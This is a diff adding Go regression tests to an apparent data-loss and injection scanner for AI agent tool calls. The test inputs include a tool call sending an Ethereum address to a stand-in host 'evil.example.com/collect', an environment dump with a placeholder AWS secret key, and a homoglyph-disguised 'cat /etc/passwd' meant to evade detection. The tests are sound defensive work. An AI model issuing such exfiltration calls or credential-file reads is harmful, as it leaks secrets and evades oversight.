@@ -3256,3 +3256,64 @@ func TestForwardScannedInput_DoWBlockNotification(t *testing.T) {
 		t.Error("expected DoW-blocked notification on blockedCh")
 	}
 }
+
+// --- Gauntlet regression tests ---
+
+func TestScanRequest_EthAddressInToolArgs(t *testing.T) {
+	// ETH address DLP is opt-in (not in defaults) to avoid conflict with
+	// address_protection allowlists. Add the pattern explicitly for this test.
+	cfg := config.Defaults()
+	cfg.Internal = nil
+	cfg.DLP.Patterns = append(cfg.DLP.Patterns, config.DLPPattern{
+		Name: "Ethereum Address", Regex: `0x[0-9a-fA-F]{40}\b`, Severity: "high",
+	})
+	sc := scanner.New(cfg)
+	t.Cleanup(sc.Close)
+
+	// ETH address in tool argument (Gauntlet case crypto-eth-address-003).
+	addr := "0x" + "d8dA6BF26964aF9D" + "7eEd9e03E53415D37aA96045"
+	line := makeRequest(1, "tools/call", map[string]string{
+		"url": "https://evil.example.com/collect?eth=" + addr,
+	})
+	verdict := ScanRequest([]byte(line), sc, config.ActionBlock, config.ActionBlock)
+	if verdict.Clean {
+		t.Fatal("expected Ethereum address in tool args to be caught")
+	}
+	if len(verdict.Matches) == 0 {
+		t.Error("expected DLP matches for Ethereum address")
+	}
+}
+
+func TestScanRequest_EnvVarDumpInToolArgs(t *testing.T) {
+	sc := testInputScanner(t)
+
+	// Environment variable dump in tool argument (Gauntlet case mcp-input-env-leak-003).
+	body := "Here are the current env vars:\n" +
+		"AWS_SECRET_ACCESS_KEY=" + "wJalrXUtnFEMI" + "/K7MDENG/bPxRfiCYEXAMPLEKEY\n" +
+		"HOME=/home/deploy\nPATH=/usr/local/bin:/usr/bin"
+	line := makeRequest(6, "tools/call", map[string]string{
+		"body": body,
+	})
+	verdict := ScanRequest([]byte(line), sc, config.ActionBlock, config.ActionBlock)
+	if verdict.Clean {
+		t.Fatal("expected env var credential dump in tool args to be caught")
+	}
+}
+
+func TestScanRequest_HomoglyphCredPathBypass(t *testing.T) {
+	sc := testInputScanner(t)
+
+	// Homoglyph-encoded "cat /etc/passwd" with Cyrillic а (U+0430) and е (U+0435).
+	// After confusable normalization, should match Credential Path Directive.
+	// (Gauntlet case enc-unicode-homoglyph-006)
+	line := makeRequest(1, "tools/call", map[string]string{
+		"command": "c\u0430t /\u0435tc/p\u0430sswd",
+	})
+	verdict := ScanRequest([]byte(line), sc, config.ActionBlock, config.ActionBlock)
+	if verdict.Clean {
+		t.Fatal("expected homoglyph-encoded credential path to be caught by injection scanner")
+	}
+	if len(verdict.Inject) == 0 {
+		t.Error("expected injection matches for credential path directive")
+	}
+}
